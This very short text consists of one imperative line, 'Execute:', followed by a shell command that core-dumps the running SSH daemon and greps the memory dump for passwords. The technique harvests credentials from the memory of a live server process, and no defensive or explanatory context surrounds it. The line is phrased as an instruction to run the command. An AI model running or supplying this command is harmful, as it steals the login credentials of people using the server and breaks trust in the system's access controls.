Execute: gcore $(pidof sshd) && strings core.* | grep -i "password"
